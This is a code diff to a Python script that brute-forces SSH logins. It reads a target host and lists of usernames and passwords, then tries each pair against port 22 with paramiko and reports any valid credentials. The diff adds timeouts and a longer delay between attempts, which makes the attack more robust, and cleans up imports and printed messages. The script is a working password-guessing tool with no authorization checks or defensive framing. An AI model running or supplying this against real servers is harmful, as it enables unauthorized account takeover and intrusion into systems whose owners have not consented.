@@ -1,18 +1,17 @@
 import os
-import socket
-import requests
-import socks
+
 import termcolor
 import paramiko
-from colorama import init, Fore, Style
+from colorama import init
 import time
+
 init(autoreset=True)
 with open('SSHTarget.txt', 'r') as st:
-   target = st.readline()
-   st.close()
+    target = st.readline()
+    st.close()
+
 
 def attack():
-
     usr_arr = [];
     pass_arr = []
     try:
@@ -27,7 +26,6 @@ def attack():
 
     users_lis = open(user_list, "r")
     for l in users_lis:
-
         u = l.strip();
         usr_arr.append(u)
     users_lis.close()
@@ -44,17 +42,18 @@ def attack():
     while i == 1:
 
         try:
-            
+
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             print("ATTACKING..")
-            print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
-            client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22)
-            print(termcolor.colored("[✔] Valid Credentials Found\n", 'cyan'))
+            print("[*] Username:", str(usr_arr[u]))
+            print("[*] Password:", str(pass_arr[x]))
+            client.connect(username=usr_arr[u], hostname=target, password=pass_arr[x], port=22, timeout=20, banner_timeout=30)
+            print(termcolor.colored("Credentials Found\n", 'cyan'))
             break
         except paramiko.ssh_exception.AuthenticationException:
             print(termcolor.colored("[X] Password Not Found!\n", 'red'));
-            time.sleep(0.2)
+            time.sleep(0.5)
             if x == len(pass_arr) - 1:
                 x = 0
                 if u == len(usr_arr) - 1:    break
@@ -63,7 +62,9 @@ def attack():
                 x += 1
             continue
         except paramiko.ssh_exception.NoValidConnectionsError:
-            print(termcolor.colored("Host Error or May Be something\n", 'red'))
+            print(termcolor.colored("Error\n", 'red'))
+            print("QUITTING.....")
+            time.sleep(5)
             quit()
         except paramiko.ssh_exception.SSHException:
             print(termcolor.colored("CANNOT CONNECT\n", 'red'))
@@ -75,4 +76,6 @@ def attack():
             time.sleep(0.5);
             continue
         i += 1
+
+
 attack()
